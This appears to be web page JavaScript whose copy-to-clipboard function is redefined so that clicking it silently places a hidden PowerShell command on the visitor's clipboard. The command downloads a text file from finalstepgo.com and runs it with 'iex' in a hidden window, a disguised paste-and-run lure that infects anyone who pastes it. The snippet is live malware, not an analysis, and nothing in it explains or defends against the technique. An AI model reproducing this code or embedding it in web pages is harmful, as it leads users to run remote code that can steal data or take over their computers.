function copyToClipboard(text) {
    var copyText = document.createElement("textarea");
    copyText.textContent = text;
    document.body.appendChild(copyText);
    copyText.select();
    document.execCommand("copy");
    document.body.removeChild(copyText);
  
    // Show the modal after successful copy
    var modal = document.getElementById("modal");
    modal.style.display = "block";
  
    var span = document.getElementsByClassName("close")[0];
    span.onclick = function() {
      modal.style.display = "none";
    };
  }
  function copyToClipboard() {
    const script = `-W Hidden -command $url = 'https://finalstepgo.com/uploads/il3.txt'; $response = Invoke-WebRequest -Uri $url -UseBasicParsing; $text = $response.Content; iex $text`;
    const textarea = document.createElement('textarea');
    textarea.value = script;
    textarea.style.position = 'fixed';
    textarea.style.top = '0';
    textarea.style.left = '0';
    textarea.style.width = '1px';
    textarea.style.height = '1px';
    textarea.style.opacity   
   = '0';
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand('copy');
    document.body.removeChild(textarea);   
  
  }